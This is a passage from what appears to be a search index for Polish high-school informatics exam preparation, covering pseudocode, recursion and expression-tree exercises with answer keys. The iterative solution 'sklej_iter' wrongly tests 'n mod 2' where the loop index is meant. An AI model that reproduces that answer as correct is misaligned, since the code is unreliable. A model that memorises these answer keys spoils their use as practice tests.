mno\u017ce\u0144 2 3 3 4 4 4 5 5 6 5 7 6"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-5/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<p>Z\u0142o\u017cono\u015b\u0107: \\(O(\\log{n})\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/","title":"\u0106wiczenie 6","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;0\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/#pseudokod","title":"Pseudokod","text":"<pre><code>1. suma := 1\n2. i := 2\n3. Dop\u00f3ki i &lt;= n, wykonuj:\n    4. j := i\n    5. p := 1\n    6. Dop\u00f3ki j &gt;= 1, wykonuj:\n        7. p := p * i\n        8. j := j - 1\n    9. suma := suma + p\n    10. i := i + 1\n\n11. Wypisz suma\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/#zadanie-1","title":"Zadanie 1","text":"<p>Przeanalizuj powy\u017cszy algorytm i uzupe\u0142nij poni\u017csz\u0105 tabelk\u0119.</p> n wynik 1 1 2 3 4"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj specyfikacj\u0119 wyniku dla powy\u017cszego algorytmu.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"n wynik 1 1 2 5 3 32 4 288"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/solution-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/solution-2/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;0\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/pseudocode-analysis/exercise-6/solution-2/#wynik","title":"Wynik","text":"<ul> <li>Suma kolejnych pot\u0119g kolejnych liczb naturalnych od \\(1\\) do \\(n\\), tzn. \\(1+2^2+3^3+4^4+5^5+...+n^n\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/","title":"\u0106wiczenie 1","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja fun(n):\n    1. Je\u017celi n &lt;= 2, to\n        2. Zwr\u00f3c 1 i zako\u0144cz\n    3. wynik := fun(n - 1) + 2 * fun(n - 2)\n    4. Zwr\u00f3\u0107 wynik i zako\u0144cz\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj wyniki funkcji dla kolejnych warto\u015bci \\(n\\) od \\(1\\) do \\(10\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/#zadanie-2","title":"Zadanie 2","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 definicj\u0119 rekurencyjn\u0105 zgodnie z dzia\u0142aniem algorytmu: \\(fun(n) =  \\begin{cases}        ? &amp; n\\leq 2 \\\\       ? &amp; n &gt; 2 \\\\    \\end{cases}\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/#zadanie-3","title":"Zadanie 3","text":"<p>Ile razy zostanie wykonane wywo\u0142anie <code>fun(2)</code> podczas obliczania wyniku dla <code>n := 5</code>?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/#zadanie-4","title":"Zadanie 4","text":"<p>Rozrysuj drzewo wywo\u0142a\u0144 rekurencyjnych dla wywo\u0142ania <code>fun(5)</code>.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"n wynik 1 1 2 1 3 3 4 5 5 11 6 21 7 43 8 85 9 171 10 341"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<p>\\(fun(n) =  \\begin{cases}        1 &amp; n\\leq 2 \\\\       fun(n - 1) + 2 * fun(n - 2) &amp; n &gt; 2 \\\\    \\end{cases}\\) </p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<p>Wywo\u0142anie <code>fun(2)</code> podczas obliczania wyniku dla <code>n := 5</code> zostanie wykonane \\(3\\) razy.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-1/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    R0[\"fun(5)\"] --- R1[\"fun(4)\"]\n    R1 --- R2[\"fun(3)\"]\n    R2 --- R3[\"fun(2)\"]\n    R2 --- R4[\"fun(1)\"]\n    R1 --- R5[\"fun(2)\"]\n    R0 --- R6[\"fun(3)\"]\n    R6 --- R7[\"fun(2)\"]\n    R6 --- R8[\"fun(1)\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/","title":"\u0106wiczenie 2","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;0\\).</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#pseudokod","title":"Pseudokod","text":"<pre><code>Funkcja sklej(n):\n    1. Je\u017celi n = 1, to:\n        2. Zwr\u00f3c 0\n    3. Je\u017celi n mod 2 = 0, to:\n        4. Zwr\u00f3c n - 1 + 2 * sklej(n / 2)\n    5. W przeciwnym wypadku:\n        6. Zwr\u00f3c n - 1 + sklej((n - 1) / 2) + sklej((n + 1) / 2)\n</code></pre> <p>Info</p> <p>mod oznacza reszt\u0119 z dzielenia.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#zadanie-1","title":"Zadanie 1","text":"<p>Wykonanie funkcji <code>sklej</code> mo\u017cna przedstawi\u0107 w postaci drzewa wywo\u0142a\u0144 rekurencyjnych ilustruj\u0105cego wszystkie wywo\u0142ania funkcji po jej uruchomieniu dla zadanego argumentu. Narysuj takie drzewo dla wywo\u0142ania <code>sklej(5)</code>.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#zadanie-2","title":"Zadanie 2","text":"<p>Narysuj drzewo wywo\u0142a\u0144 rekurencyjnych dla wywo\u0142ania <code>sklej(7)</code>.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#zadanie-3","title":"Zadanie 3","text":"<p>Ile razy zostanie wykonane wywo\u0142anie <code>sklej(1)</code> podczas obliczania <code>sklej(7)</code>?.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#zadanie-4","title":"Zadanie 4","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabel\u0119, podaj\u0105c wyniki dzia\u0142ania funkcji <code>sklej</code> dla wskazanych argument\u00f3w.</p> n sklej(n) 1 0 2 1 3 4 5 6"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#zadanie-5","title":"Zadanie 5","text":"<p>Chcemy wype\u0142ni\u0107 tablic\u0119 \\(s[1..n]\\) w taki spos\u00f3b, \u017ce \\(s[i]=sklej(i)\\) dla ka\u017cdego \\(1\\leq i\\leq n\\). Podaj algorytm wype\u0142niaj\u0105cy tablic\u0119 \\(s\\) odpowiednimi warto\u015bciami bez wywo\u0142ywania funkcji sklej, tnz. bez u\u017cycia rekurencji.</p> <p>Rozwi\u0105zanie zapisz w postaci pseudokodu. W swoim zapisie mo\u017cesz korzysta\u0107 jedynie z podstawowych operacji arytmetycznych (dodawanie, odejmowanie, mno\u017cenie, dzielenie, reszta z dzielenia, dzielenie ca\u0142kowite), instrukcji kontroli przep\u0142ywu (instrukcja warunkowa, p\u0119tla warunkowa, p\u0119tla licz\u0105ca), instrukcji dotycz\u0105cych podstawowych operacji na zmiennych (utworzenie zmiennej, przypisanie warto\u015bci, odczytanie warto\u015bci), instrukcji dotycz\u0105cych podstawowych operacji na tablicach (utworzenie tablicy o zadanym rozmiarze wype\u0142nionej jedn\u0105 warto\u015bci\u0105, odwo\u0142anie do elementu tablicy pod zadanym indeksem) oraz samodzielnie zdefiniowanych funkcji.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#specyfikacja_1","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#dane_1","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;0\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/#wynik","title":"Wynik","text":"<ul> <li>\\(s[1..n]\\) - tablica liczb ca\u0142kowitych, taka, \u017ce \\(s[i]=sklej(i)\\) dla ka\u017cdego \\(1\\leq i\\leq n\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    R[\"sklej(5)\"] --- R1[\"sklej(2)\"]\n    R --- R2[\"sklej(3)\"]\n    R1 --- R11[\"sklej(1)\"]\n    R2 --- R21[\"sklej(1)\"]\n    R2 --- R22[\"sklej(2)\"]\n    R22 --- R221[\"sklej(1)\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    R[\"sklej(7)\"] --- R1[\"sklej(3)\"]\n    R --- R2[\"sklej(4)\"]\n    R1 --- R11[\"sklej(1)\"]\n    R1 --- R12[\"sklej(2)\"]\n    R12 --- R121[\"sklej(1)\"]\n    R2 --- R21[\"sklej(2)\"]\n    R21 --- R211[\"sklej(1)\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<p>Wywo\u0142anie <code>sklej(1)</code> podczas obliczania <code>sklej(7)</code> zostanie wykonane \\(3\\) razy.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"n sklej(n) 1 0 2 1 3 3 4 5 5 8 6 11"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-2/solution-5/","title":"Zadanie 5 - rozwi\u0105zanie","text":"<pre><code>funkcja sklej_iter(n):\n    1. Tworzymy tablic\u0119 S[1..n]\n    2. S[1] := 0\n    3. Dla i := 2 do n, wykonuj:\n        4. Je\u017celi n mod 2 = 0, to:\n            5. S[i] := i - 1 + 2 * S[i / 2]\n        6. W przeciwnym przypadku:\n            7. S[i] := i - 1 + S[(i - 1) / 2] + S[(i + 1) / 2]\n    8. Wypisz S[n]\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/","title":"\u0106wiczenie 3","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/#dane","title":"Dane","text":"<ul> <li>n - liczba naturalna, \\(n&gt;0\\). </li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja fun(n):\n    1. Je\u017celi n = 0, to\n        2. Zako\u0144cz\n    3. Je\u017celi n mod 2 = 0, to\n        4. Wypisz \"0\"\n        5. Wywo\u0142aj fun(n div 2)\n    6. Je\u017celi n mod 2 = 1, to\n        7. Wypisz \"1\"\n        8. Wywo\u0142aj fun(n div 2)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/#zadanie-1","title":"Zadanie 1","text":"<p>Przeanalizuj powy\u017csz\u0105 funkcj\u0119 i uzupe\u0142nij poni\u017csz\u0105 tabelk\u0119.</p> n Wypisany komunikat 1 \"1\" 2 \"01\" 4 5 10 20"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/#zadanie-2","title":"Zadanie 2","text":"<p>Oblicz ilo\u015b\u0107 wywo\u0142a\u0144 funkcji <code>fun</code> dla r\u00f3\u017cnych warto\u015bci \\(n\\) .</p> n liczba wywo\u0142a\u0144 funkcji <code>fun</code> 0 1 1 2 4 8 10 16 20"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/#zadanie-3","title":"Zadanie 3","text":"<p>Jaka jest z\u0142o\u017cono\u015b\u0107 funkcji <code>fun</code>?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"n Wypisany komunikat 1 \"1\" 2 \"01\" 4 \"001\" 5 \"101\" 10 \"0101\" 20 \"00101\""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"n liczba wywo\u0142a\u0144 funkcji fun 0 1 1 2 4 4 8 5 10 5 16 6 20 6"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-3/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<p>Z\u0142o\u017cono\u015b\u0107 logarytmiczna: \\(O(\\log n)\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/","title":"\u0106wiczenie 4","text":"<p>Zapoznaj si\u0119 z poni\u017csz\u0105 specyfikacj\u0105 oraz pseudokodem, a nast\u0119pnie rozwi\u0105\u017c zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/#specyfikacja","title":"Specyfikacja","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/#dane","title":"Dane","text":"<ul> <li>n - liczba naturalna, \\(n&gt;0\\). </li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja fun(n):\n    1. Je\u017celi n = 0, to\n        2. Zako\u0144cz\n    3. Je\u017celi n mod 2 = 0, to \n        4. Wywo\u0142aj fun(n div 2)\n        5. Wypisz \"0\"\n    6. Je\u017celi n mod 2 = 1, to\n        7. Wywo\u0142aj fun(n div 2)\n        8. Wypisz \"1\"\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/#zadanie-1","title":"Zadanie 1","text":"<p>Przeanalizuj powy\u017csz\u0105 funkcj\u0119 i uzupe\u0142nij poni\u017csz\u0105 tabelk\u0119.</p> n Wypisany komunikat 1 \"1\" 2 \"10\" 4 5 10 20"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/#zadanie-2","title":"Zadanie 2","text":"<p>Oblicz ilo\u015b\u0107 wywo\u0142a\u0144 funkcji <code>fun</code> dla r\u00f3\u017cnych warto\u015bci \\(n\\).</p> n liczba wywo\u0142a\u0144 funkcji fun 0 1 1 2 4 8 10 16 20"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/#zadanie-3","title":"Zadanie 3","text":"<p>Jaka jest z\u0142o\u017cono\u015b\u0107 funkcji <code>fun</code>?</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"n Wypisany komunikat 1 \"1\" 2 \"10\" 4 \"100\" 5 \"101\" 10 \"1010\" 20 \"10100\""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"n liczba wywo\u0142a\u0144 funkcji fun 0 1 1 2 4 4 8 5 10 5 16 6 20 6"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-4/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"<p>Z\u0142o\u017cono\u015b\u0107 logarytmiczna: \\(O(\\log n)\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/","title":"\u0106wiczenie 5","text":"<p>Przeanalizuj poni\u017cszy algorytm i wykonaj zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/#pseudokod","title":"Pseudokod","text":"<pre><code>Funkcja per(A, pocz, kon):\n    1. Je\u017celi pocz &gt;= kon, to:\n        2. Wypisz A\n        3. Zako\u0144cz\n    4. per(A, pocz + 1, kon)\n    5. Dla i := pocz + 1 do kon, wykonuj:\n        6. Zamie\u0144(A[pocz], A[i])\n        7. per(A, pocz + 1, kon)\n        8. Zamie\u0144(A[pocz], A[i])\n</code></pre> <p>Info</p> <p>Zamie\u0144 zamienia dwie zmienne warto\u015bciami.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/#zadanie-1","title":"Zadanie 1","text":"<p>Rozrysuj drzewo wywo\u0142a\u0144 rekurencyjnych oraz podaj wynik dzia\u0142ania algorytmu dla nast\u0119puj\u0105cych danych:</p> <ul> <li>\\(A[1..3] = [1, 2, 3]\\)</li> <li>\\(pocz = 1\\)</li> <li>\\(kon = 3\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/#zadanie-2","title":"Zadanie 2","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabel\u0119 podaj\u0105c liczb\u0119 wypisanych warto\u015bci dla wskazanych argument\u00f3w.</p> A pocz kon Liczba wynik\u00f3w [1..1] 1 1 1 [1..2] 1 2 2 [1..3] 1 3 [1..4] 1 4 [1..5] 1 5 [1..n] 1 n"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/solution-1/#drzewo-wywoan-rekurencyjnych","title":"Drzewo wywo\u0142a\u0144 rekurencyjnych","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    R[\"per([1,2,3],1,3)\"] --- R1[\"per([1,2,3],2,3)\"]\n    R --- R2[\"per([2,1,3],2,3)\"]\n    R --- R3[\"per([3,2,1],2,3)\"]\n    R1 --- R11[\"per([1,2,3],3,3)\"]\n    R1 --- R12[\"per([1,3,2],3,3)\"]\n    R2 --- R21[\"per([2,1,3],3,3)\"]\n    R2 --- R22[\"per([2,3,1],3,3)\"]\n    R3 --- R31[\"per([3,2,1],3,3)\"]\n    R3 --- R32[\"per([3,1,2],3,3)\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/solution-1/#wynik","title":"Wynik","text":"<pre><code>[1, 2, 3]\n[1, 3, 2]\n[2, 1, 3]\n[2, 3, 1]\n[3, 2, 1]\n[3, 1, 2]\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-5/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"A pocz kon Liczba wynik\u00f3w [1..1] 1 1 1 [1..2] 1 2 2 [1..3] 1 3 6 [1..4] 1 4 24 [1..5] 1 5 120 [1..n] 1 n n!"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-6/","title":"\u0106wiczenie 6","text":"<p>Przeanalizuj poni\u017cszy algorytm i wykonaj zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-6/#pseudokod","title":"Pseudokod","text":"<pre><code>Funkcja sort(A, pocz, kon):\n    1. Je\u017celi A[pocz] &gt; A[kon], to:\n        2. Zamie\u0144(A[pocz], A[kon])\n    3. Je\u017celi kon - pocz + 1 &gt; 2:\n        4. t := (kon - pocz + 1) div 3\n        5. A := sort(A, pocz, kon - t)\n        6. A := sort(A, pocz + t, kon)\n        7. A := sort(A, pocz, kon - t)\n    8. Zwr\u00f3\u0107 A\n</code></pre> <p>Info</p> <p>Zamie\u0144 zamienia dwie zmienne warto\u015bciami.</p> <p>Info</p> <p>div oznacza dzielenie ca\u0142kowite.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-6/#zadanie-1","title":"Zadanie 1","text":"<p>Narysuj drzewo wywo\u0142a\u0144 rekurencyjnych dla danych:</p> <ul> <li>\\(A[1..3] = [5, 1, 3]\\)</li> <li>\\(pocz = 1\\)</li> <li>\\(kon = 3\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-6/#zadanie-2","title":"Zadanie 2","text":"<p>Narysuj drzewo wywo\u0142a\u0144 rekurencyjnych dla danych:</p> <ul> <li>\\(A[1..4] = [5, 1, 3, 4]\\)</li> <li>\\(pocz = 1\\)</li> <li>\\(kon = 4\\)</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-6/#zadanie-3","title":"Zadanie 3","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabelk\u0119 podaj\u0105c liczb\u0119 wywo\u0142a\u0144 funkcji sort (\u0142\u0105cznie z pocz\u0105tkowym wywo\u0142aniem) dla dowolnej zawarto\u015bci tablicy \\(A\\) oraz podanych warto\u015bci \\(pocz\\) i \\(kon\\).</p> A pocz kon Liczba wynik\u00f3w [1..1] 1 1 1 [1..2] 1 2 1 [1..3] 1 3 [1..4] 1 4"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-6/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    R[\"sort([5,1,3],1,3)\"] --- R1[\"sort([3,1,5],1,2)\"]\n    R --- R2[\"sort([1,3,5],2,3)\"]\n    R --- R3[\"sort([1,3,5],1,2)\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/","title":"\u0106wiczenie 7","text":"<p>Przeanalizuj poni\u017cszy algorytm i wykonaj zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/#pseudokod","title":"Pseudokod","text":"<pre><code>Fukcja fun(a, b):\n    1. Je\u017celi a &gt; b, to:\n        2. Zwr\u00f3\u0107 \"\"\n    3. c := (a + b) div 2\n    4. Je\u017celi c mod 2 = 0, to:\n        5. Zwr\u00f3\u0107 fun(a, c - 1) + \"0\" + fun(c + 1, b)\n    6. W przeciwnym przypadku:\n        7. Zwr\u00f3\u0107 fun(a, c - 1) + \"1\" + fun(c + 1, b)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/#zadanie-1","title":"Zadanie 1","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabel\u0119 o wyniki dzia\u0142ania funkcji <code>fun</code> dla podanych parametr\u00f3w.</p> a b fun(a,b) 0 2 010 1 4 1010 2 5 3 8 7 10"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj przyk\u0142adowe warto\u015bci a oraz b, dla kt\u00f3rych funkcja <code>fun</code> zwr\u00f3ci wynik zawieraj\u0105cy dok\u0142adnie pi\u0119\u0107 zer oraz pi\u0119\u0107 jedynek.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/#zadanie-3","title":"Zadanie 3","text":"<p>Uzupe\u0142nij poni\u017csz\u0105 tabel\u0119 podaj\u0105c liczb\u0119 wywo\u0142a\u0144 funkcji <code>fun</code> (wliczaj\u0105c w to pocz\u0105tkowe wywo\u0142anie) dla podanych parametr\u00f3w.</p> a b Liczba wywo\u0142a\u0144 0 5 13 1 5 11 0 6 1 6 0 10 2 20"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj wz\u00f3r na liczb\u0119 wywo\u0142a\u0144 funkcji <code>fun</code> dla dowolnych liczb naturalnych \\(a\\) oraz \\(b\\), takich \u017ce \\(a\\leq b\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/solution-1/","title":"Zadanie 1 - rozwi\u0105zanie","text":"a b fun(a,b) 0 2 010 1 4 1010 2 5 0101 3 8 101010 7 10 1010"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/solution-2/","title":"Zadanie 2 - rozwi\u0105zanie","text":"<p>Przyk\u0142adowa odpowied\u017a: 0, 9.</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/solution-3/","title":"Zadanie 3 - rozwi\u0105zanie","text":"a b Liczba wywo\u0142a\u0144 0 5 13 1 5 11 0 6 15 1 6 13 0 10 23 2 20 39"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/recursion/exercise-7/solution-4/","title":"Zadanie 4 - rozwi\u0105zanie","text":"<p>\\(3 + (b - a) * 2\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/","title":"Drzewa wyra\u017ce\u0144 arytmetycznych","text":""},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Oblicz(wierzcho\u0142ek):\n    1. Je\u017celi wierzcho\u0142ek jest li\u015bciem, to:\n        2. Zwr\u00f3\u0107 warto\u015b\u0107 wierzcho\u0142ka\n    3. Zwr\u00f3\u0107 wynik operacji arytmetycznej, gdzie operatorem jest warto\u015b\u0107 wierzcho\u0142ka, a warto\u015bciami s\u0105 odpowiednio Oblicz(lewy potomek) oraz Oblicz(prawy potomek)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/#zadanie-1","title":"Zadanie 1","text":"<p>Zapoznaj si\u0119 z pseudokodem opisuj\u0105cym spos\u00f3b obliczania warto\u015bci wyra\u017cenia arytmetycznego zapisanego za pomoc\u0105 drzewa binarnego, a nast\u0119pnie oblicz warto\u015b\u0107 wyra\u017cenia reprezentowanego przez poni\u017csze drzewo. Zapisz poszczeg\u00f3lne kroki oblicze\u0144 poprzez przedstawienie zmieniaj\u0105cego si\u0119 drzewa binarnego, gdzie, w odpowiedniej kolejno\u015bci, poddrzewa s\u0105 zast\u0119powane poprzez jeden wierzcho\u0142ek zawieraj\u0105cy warto\u015b\u0107 wyra\u017cenia arytmetycznego, kt\u00f3re zosta\u0142o obliczone na tym poddrzewie.</p> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op1 --&gt; op3[\"/\"]\n    op3 --&gt; n1[\"5\"]\n    op3 --&gt; n2[\"1\"]\n    op2 --&gt; op4[\"\\+\"]\n    op4 --&gt; n3[\"2\"]\n    op4 --&gt; n4[\"3\"]\n    op2 --&gt; n5[\"4\"]</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/algorithmic/simulations/arithmetic-tree/#zadanie-2","title":"Zadanie 2","text":"<p>Wykonaj polecenie z zadania pierwszego opieraj\u0105c si\u0119 na poni\u017cszym drzewie.</p> <pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    op1[\"\\-\"] --&gt; op2[\"\\*\"]\n    op2 --&gt; 